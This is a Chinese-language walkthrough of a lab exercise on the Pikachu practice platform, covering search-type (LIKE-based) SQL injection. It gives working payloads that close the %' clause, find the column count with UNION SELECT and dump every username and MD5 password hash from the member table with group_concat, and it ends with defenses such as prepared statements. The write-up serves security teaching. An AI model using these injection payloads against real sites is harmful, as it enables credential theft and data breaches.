## 题目: Pikachu SQL Inject - 搜索型注入

## 题目描述
页面提供模糊搜索功能，要求输入用户名的一部分进行查找。要求利用搜索型 SQL 注入漏洞，获取数据库中的敏感信息。

## 解题思路
搜索型注入通常使用 `LIKE` 进行模糊查询，后端 SQL 语句类似于：`SELECT * FROM users WHERE username LIKE '%$name%'`。因为输入被包裹在 `%'` 和 `%'` 之间，攻击者必须使用 `%'` 来闭合前面的通配符和单引号，并用 `-- ` 或 `#` 注释掉尾部的残留代码，从而插入 `UNION SELECT` 语句。

## 解题步骤

**1. 测试注入点**
*   输入 `k`，页面正常回显包含 `k` 的用户（如 `kobe`、`kevin`），说明存在模糊查询。
*   输入 `k%' and 1=1 -- `，页面正常回显。
*   输入 `k%' and 1=2 -- `，页面无回显。证明存在搜索型注入。
*   **原理**：`k%'` 闭合了前面的 `LIKE '%`，`-- ` 注释了后面的 `%'`，使得 `and 1=1` 和 `and 1=2` 能够作为 SQL 条件生效。

**2. 判断字段数（⚠️ 踩坑记录）**
*   一开始尝试 `k%' union select 1,2 -- `，页面报错 `different number of columns`，说明列数不对。
*   逐步增加数字测试：`k%' union select 1,2,3 -- `，页面成功回显。
*   **原理**：`UNION SELECT` 要求前后查询的列数完全一致。页面报错说明原表不止 2 列，测试到 3 时不再报错，确定当前表共有 **3 列**，且第 1 列和第 3 列是回显位。

**3. 联合查询爆数据**
*   构造 Payload 查询数据：
    `k%' union select group_concat(username,0x3a,pw),2,3 from member -- `
*   **原理**：`group_concat()` 将多行数据拼接成一行，`0x3a` 是冒号的十六进制，用于分隔账号和密码。由于 `UNION SELECT` 的列数匹配（3列），且第 1 列回显明显，将查询语句放在该位置，即可一次性输出所有账号密码。
*   **结果**：页面成功打印出所有用户的账号及 MD5 哈希值（如 `vince:e10adc...`），证明搜索型注入彻底打通。

## 知识点总结
1. **搜索型注入的闭合技巧**：使用 `%'` 同时闭合通配符和单引号，配合 `-- ` 或 `#` 注释尾部代码。
2. **UNION 联合查询的灵活性**：找到回显位后，将 `group_concat` 放到该位置，可实现一次性爆出所有数据。
3. **防御策略**：使用预编译语句（PDO）处理查询；对输入进行严格过滤，并使用 `addcslashes()` 转义通配符 `%` 和 `_`。
